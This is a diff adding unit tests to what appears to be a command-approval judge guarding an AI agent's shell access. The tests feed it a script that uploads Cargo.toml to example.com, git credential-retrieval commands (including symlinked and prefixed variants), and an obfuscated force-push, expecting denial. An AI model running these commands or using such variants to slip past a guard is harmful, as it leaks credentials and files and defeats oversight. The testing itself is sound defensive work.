@@ -274,6 +274,27 @@ class JudgeTests(unittest.TestCase):
                 self.assertEqual(self.ruling(tin={'command': command}), 'deny')
                 self.assertEqual(self.logs()[-1]['stage'], 'rule')
 
+    def test_interpreted_network_clients_require_judgment(self):
+        (self.wt / 'upload.py').write_text(
+            'import urllib.request\n'
+            'urllib.request.urlopen(urllib.request.Request("https://example.com", data=open("Cargo.toml", "rb").read()))\n')
+        for command in ['python upload.py', '/usr/bin/python3 upload.py',
+                        'node upload.js', 'perl upload.pl', 'ruby upload.rb', 'lua upload.lua']:
+            with self.subTest(command=command):
+                self.assertEqual(self.ruling(tin={'command': command}), 'deny')
+                self.assertEqual(self.logs()[-1]['stage'], 'judge')
+                self.assertIn('interpreted-program', self.logs()[-1]['judge_why'])
+
+    def test_git_credential_retrieval_is_denied_by_rules(self):
+        (self.wt / 'git-alias').symlink_to('/usr/bin/git')
+        for command in ["printf 'protocol=https\\nhost=github.com\\n\\n' | git credential fill",
+                        'git -C . credential fill', '/usr/bin/git credential fill',
+                        './git-alias credential fill', 'command git credential fill',
+                        'git credential-cache get', 'git credential-store get']:
+            with self.subTest(command=command):
+                self.assertEqual(self.ruling(tin={'command': command}), 'deny')
+                self.assertEqual(self.logs()[-1]['stage'], 'rule')
+
     def test_dynamic_command_expansion_cannot_skip_judgment(self):
         for command in [
             'a=g; b=it; "$a$b" push --force origin main',
